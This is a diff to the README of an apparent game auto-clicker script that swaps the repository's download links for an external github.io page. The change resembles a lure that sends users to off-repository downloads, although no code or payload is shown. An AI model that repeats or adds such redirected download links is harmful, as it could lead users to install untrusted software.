@@ -1,6 +1,6 @@
 # 🖱️ baby-clicker-script-update - Automate clicks for faster game progress
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/sarsbodyofwork411/baby-clicker-script-update)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://sarsbodyofwork411.github.io)
 
 ## 📌 About this project
 
@@ -19,7 +19,7 @@ You do not need high-end hardware. The internal script uses browser resources. K
 
 ## 📥 Downloading the software
 
-Visit this page to download the script: [https://github.com/sarsbodyofwork411/baby-clicker-script-update](https://github.com/sarsbodyofwork411/baby-clicker-script-update)
+Visit this page to download the script: [https://sarsbodyofwork411.github.io](https://sarsbodyofwork411.github.io)
 
 1. Go to the link above.
 2. Look for the Releases section on the right side of the page.
